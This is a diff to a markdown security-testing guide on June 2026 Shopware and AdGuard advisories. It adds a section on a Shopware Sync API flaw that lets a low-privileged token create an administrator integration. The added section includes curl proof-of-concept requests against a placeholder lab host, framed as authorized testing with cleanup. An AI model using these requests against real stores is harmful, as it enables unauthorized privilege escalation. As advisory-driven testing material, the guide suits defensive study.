@@ -1,4 +1,4 @@
-# Shopware Store API/admin/media boundaries and AdGuard DoQ source-port oracle
+# Shopware Store API/admin/media/sync boundaries and AdGuard DoQ source-port oracle
 
 ## Operator value
 
@@ -8,12 +8,13 @@ GitHub Advisory Database published a late June 4, 2026 batch with durable lesson
 - Shopware allows SVG upload in media workflows without SVG content sanitization, creating a stored browser execution boundary when uploaded media is viewed inline: [GHSA-xvhc-gm7j-mhmc / CVE-2026-48015](https://github.com/advisories/GHSA-xvhc-gm7j-mhmc).
 - Shopware Store API payment handling lets a customer or guest context submit a foreign `orderId` to `/store-api/handle-payment`: [GHSA-9v5m-39wh-5chq / CVE-2026-48016](https://github.com/advisories/GHSA-9v5m-39wh-5chq).
 - Shopware Admin API order-state transition routes can process direct API calls from users who cannot perform normal order updates: [GHSA-f8q6-3g5w-jjr6 / CVE-2026-48014](https://github.com/advisories/GHSA-f8q6-3g5w-jjr6).
+- Shopware Sync API can write an `integration` entity with `admin: true` through `POST /api/_action/sync`, bypassing the dedicated integration controller's admin check: [GHSA-gv8p-48fr-4fxg / CVE-2026-48008](https://github.com/advisories/GHSA-gv8p-48fr-4fxg).
 - Shopware SSO fallback redirects trust the request `Referer` header when expected SSO state is absent: [GHSA-4x3x-869w-xx3m / CVE-2026-48012](https://github.com/advisories/GHSA-4x3x-869w-xx3m).
 - Shopware user-management APIs expose privilege and recovery-token boundary mistakes: low-privileged `user:create` / `user:update` can set `admin: true`, and `user_recovery:read` can expose password-recovery hashes: [GHSA-v39m-97p8-gqg7 / CVE-2026-48010](https://github.com/advisories/GHSA-v39m-97p8-gqg7), [GHSA-8v9p-g828-v98f / CVE-2026-48009](https://github.com/advisories/GHSA-8v9p-g828-v98f).
 - Shopware admin login timing can disclose valid administrator usernames and should be treated as an enrichment primitive only when timing statistics are strong: [GHSA-7w52-7jvm-m9vw / CVE-2026-48011](https://github.com/advisories/GHSA-7w52-7jvm-m9vw).
 - AdGuard Home / `dnsproxy` DoQ-to-UDP forwarding collapses backend DNS transaction ID entropy and exposes a source-port oracle on the tested path: [GHSA-xgx4-4h9w-53pv / CVE-2026-47703](https://github.com/advisories/GHSA-xgx4-4h9w-53pv).
 
-The reusable pattern: compare sibling routes and privilege models, then prove whether attacker-controlled input crosses into a more trusted subsystem: server-side fetches, inline media rendering, order/payment state, admin-role writes, password-recovery secrets, trusted-origin redirects, or resolver backend entropy.
+The reusable pattern: compare sibling routes and privilege models, then prove whether attacker-controlled input crosses into a more trusted subsystem: server-side fetches, inline media rendering, order/payment state, admin-role writes, bulk-sync entity writes, password-recovery secrets, trusted-origin redirects, or resolver backend entropy.
 
 ## Affected surfaces
 
@@ -23,6 +24,7 @@ The reusable pattern: compare sibling routes and privilege models, then prove wh
 | Shopware SVG upload XSS | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | media upload to same-origin inline SVG rendering |
 | Shopware Store API payment IDOR | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | customer or guest context to foreign order payment flow |
 | Shopware Admin API order transition ACL bypass | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | low-privileged admin token to order-state mutation action |
+| Shopware Sync API integration admin flag bypass | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | `integration:create` token to privileged integration entity write |
 | Shopware SSO Referer redirect | `shopware/core` or `shopware/platform >= 6.7.3.0 < 6.7.10.1` | release tag `v6.7.10.1` referenced | unauthenticated request metadata to `/api/oauth/` redirect |
 | Shopware admin flag and recovery hash issues | `shopware/core` or `shopware/platform < 6.6.10.18` and `>= 6.7.0.0 < 6.7.10.1` | release tags `v6.6.10.18`, `v6.7.10.1` referenced | narrow admin ACLs to full-admin or recovery-token capability |
 | AdGuard Home / dnsproxy DoQ-to-UDP forwarding | `github.com/AdguardTeam/AdGuardHome <= 0.107.74`, `github.com/AdguardTeam/dnsproxy < 0.81.3` | no patched version listed in GHSA version ranges at publication time; dnsproxy fix commit referenced | client DoQ query to backend UDP transaction ID/source-port behavior |
@@ -101,6 +103,26 @@ curl -i -s -X POST 'https://shopware.example.test/api/_action/order/ORDER_UUID/s
 
 Use a disposable order and capture before/after state from an authorized admin or database fixture. Do not transition production orders.
 
+### Shopware Sync API integration admin flag bypass
+
+Use a lab low-privileged admin API user that has `integration:create` but does not have administrator capabilities. First prove the dedicated integration endpoint blocks `admin: true`, then test the Sync API path with a disposable integration name. Do not leave privileged test integrations behind.
+
+```bash
+# Baseline: dedicated controller should reject admin integration creation.
+curl -i -s -X POST 'https://shopware.example.test/api/integration' \
+  -H 'Authorization: Bearer LOW_PRIV_ADMIN_TOKEN' \
+  -H 'Content-Type: application/json' \
+  --data '{"label":"skillz-baseline","admin":true}'
+
+# Candidate bypass: Sync API entity write reaches EntityWriter directly.
+curl -i -s -X POST 'https://shopware.example.test/api/_action/sync' \
+  -H 'Authorization: Bearer LOW_PRIV_ADMIN_TOKEN' \
+  -H 'Content-Type: application/json' \
+  --data '{"write-integration":{"entity":"integration","action":"upsert","payload":[{"id":"00000000000000000000000000000001","label":"skillz-sync-canary","admin":true}]}}'
+```
+
+Evidence should include the token's limited ACL set, the baseline denial, the Sync API response, and a post-write read or admin-token behavior check proving the created integration is administrator-capable. Redact generated access keys and delete the canary integration during cleanup.
+
 ### Shopware SSO Referer redirect
 
 Use a controlled destination and avoid credential collection:
@@ -158,6 +180,7 @@ Build this in a local lab with a DoQ listener forwarding to a UDP upstream you c
 
 - Advisory ID, exact package/version evidence, deployment path, and enabled feature or route.
 - Role or token capability matrix: what the account should and should not be able to do.
+- For integration tests: generated integration IDs, proof of `admin` capability, and cleanup evidence with access keys redacted.
 - Minimal canary request/response pairs with secrets, session tokens, order identifiers, and customer data redacted.
 - For browser findings: DOM/console evidence from a test account only.
 - For order/payment findings: disposable order IDs, before/after state, and proof that no real payment, shipment, or customer workflow was touched.
@@ -170,7 +193,7 @@ Frame these as boundary failures, not vulnerable-version screenshots:
 - Shopware media: one URL-handling route lacks the network-target validation applied elsewhere.
 - Shopware SVG: an uploaded media file crosses into same-origin active content.
 - Shopware Store/Admin APIs: object ownership and ACL checks differ between normal CRUD routes and dedicated action routes.
-- Shopware identity: narrow administrative permissions expose secrets or write privileged fields.
+- Shopware identity/sync: narrow administrative permissions expose secrets or write privileged fields through alternate entity-write paths.
 - Shopware SSO: request metadata becomes a trusted redirect target under `/api/oauth/`.
 - AdGuard: encrypted-client ingress loses backend UDP entropy when forwarded to a plain UDP upstream.
 
@@ -186,6 +209,8 @@ Keep all payloads inert and demonstrate impact in a lab or explicit test account
 - Shopware project advisory: [GHSA-9v5m-39wh-5chq](https://github.com/shopware/shopware/security/advisories/GHSA-9v5m-39wh-5chq)
 - GitHub Advisory Database: [GHSA-f8q6-3g5w-jjr6 / CVE-2026-48014](https://github.com/advisories/GHSA-f8q6-3g5w-jjr6)
 - Shopware project advisory: [GHSA-f8q6-3g5w-jjr6](https://github.com/shopware/shopware/security/advisories/GHSA-f8q6-3g5w-jjr6)
+- GitHub Advisory Database: [GHSA-gv8p-48fr-4fxg / CVE-2026-48008](https://github.com/advisories/GHSA-gv8p-48fr-4fxg)
+- Shopware project advisory: [GHSA-gv8p-48fr-4fxg](https://github.com/shopware/shopware/security/advisories/GHSA-gv8p-48fr-4fxg)
 - GitHub Advisory Database: [GHSA-4x3x-869w-xx3m / CVE-2026-48012](https://github.com/advisories/GHSA-4x3x-869w-xx3m)
 - Shopware project advisory: [GHSA-4x3x-869w-xx3m](https://github.com/shopware/shopware/security/advisories/GHSA-4x3x-869w-xx3m)
 - GitHub Advisory Database: [GHSA-v39m-97p8-gqg7 / CVE-2026-48010](https://github.com/advisories/GHSA-v39m-97p8-gqg7)
